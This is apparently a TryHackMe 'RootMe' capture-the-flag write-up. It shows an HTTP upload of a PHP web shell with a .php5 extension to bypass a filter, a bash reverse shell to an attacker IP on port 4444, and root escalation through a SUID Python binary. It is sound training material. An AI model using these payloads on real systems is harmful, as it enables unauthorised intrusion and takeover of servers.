---
title: RootMe
description: 'Uploading a malicious PHP script and privileges escalation through Python with SUID permissions'
pubDate: 2021-06-27
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png'
---

## RCE
Found `/panel/` by fuzzing


Upload a simple PHP RCE, with `.php5` extension to bypass a filter:

```
POST /panel/ HTTP/1.1
Host: 10.10.205.210
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4274716328538659251235427623
Content-Length: 387
Origin: http://10.10.205.210
Connection: close
Referer: http://10.10.205.210/panel/
Cookie: PHPSESSID=4e1q8lgpkem14g3gba3bo4ultg
Upgrade-Insecure-Requests: 1

-----------------------------4274716328538659251235427623
Content-Disposition: form-data; name="fileUpload"; filename="cmd.php5"
Content-Type: application/octet-stream

<?php system($_REQUEST['cmd']); ?>

-----------------------------4274716328538659251235427623
Content-Disposition: form-data; name="submit"

Upload
-----------------------------4274716328538659251235427623--
```

Execute `http://10.10.205.210/uploads/cmd.php5?cmd=id`
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## USER
Execute a bash reverse shell:

```
POST /uploads/cmd.php5 HTTP/1.1
Host: 10.10.205.210
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=4e1q8lgpkem14g3gba3bo4ultg
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

cmd=bash+-c+"/bin/bash+-i+>%26+/dev/tcp/10.8.200.250/4444+0>%261"
```

```bash
find / -name "user.txt" 2>/dev/null
cat /var/www/user.txt
```

## ROOT
Find all SUID file:

```bash
find . -perm /4000 2>/dev/null | grep -v "\/snap"

...[snip]...
./usr/bin/python
...[snip]...
```

```bash
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

This gives a root shell
